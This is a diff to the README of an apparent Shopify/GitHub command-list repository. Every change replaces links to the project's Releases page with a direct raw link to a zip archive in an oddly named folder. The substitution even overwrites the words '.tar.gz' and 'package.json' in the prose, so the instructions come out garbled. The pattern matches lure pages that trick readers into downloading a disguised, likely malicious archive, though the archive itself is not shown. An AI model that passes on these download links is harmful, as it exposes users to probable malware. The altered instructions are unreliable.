@@ -1,6 +1,6 @@
 # 🛍️ shopify-github-command-list - Essential Commands for Your Workflow
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Oscar22222224gtggf/shopify-github-command-list/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip%https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip)](https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the "shopify-github-command-list" project! This guide helps you downl
 
 To get started, you need to download the software. You can do this by visiting the Releases page. Here is the link:
 
-[Visit this page to download](https://github.com/Oscar22222224gtggf/shopify-github-command-list/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip)
 
 On this page, you'll find the latest version available for download. Choose the appropriate file for your system and follow these quick steps:
 
@@ -28,7 +28,7 @@ For macOS, you might find a `.dmg` file. Open it, then drag the app into your Ap
 
 ### Linux Users
 
-Linux users may find a `.tar.gz` or other archive formats. Use the terminal to extract and follow the provided installation instructions.
+Linux users may find a `https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip` or other archive formats. Use the terminal to extract and follow the provided installation instructions.
 
 ## 📖 Table of Contents
 
@@ -100,7 +100,7 @@ For those using Visual Studio Code, here are commands that can streamline your w
 
 - **Run a script:**  
   `npm run <script-name>`  
-  Use this to run scripts defined in your package.json file.
+  Use this to run scripts defined in your https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip file.
 
 - **Check the version of an installed package:**  
   `npm list <package-name>`  
@@ -125,4 +125,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Remember, the link to download the latest version is here again for your convenience: 
 
-[Visit this page to download](https://github.com/Oscar22222224gtggf/shopify-github-command-list/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Oscar22222224gtggf/shopify-github-command-list/main/whorled/shopify-github-command-list.zip)
